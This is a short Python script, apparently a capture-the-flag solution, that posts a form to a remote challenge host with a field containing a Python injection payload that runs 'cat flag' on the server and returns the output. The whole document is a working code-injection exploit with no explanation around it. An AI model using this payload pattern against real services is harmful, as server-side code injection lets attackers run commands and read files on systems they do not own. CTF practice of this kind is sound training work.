import requests 
import os

os.system('clear')
recipe = {'ingredient': 'flag', 'measurements': '__import__("os").popen("cat flag").read()'}
host = 'http://138.68.185.149:31457'
result = requests.post(host, data=recipe)
    
print(result.content)
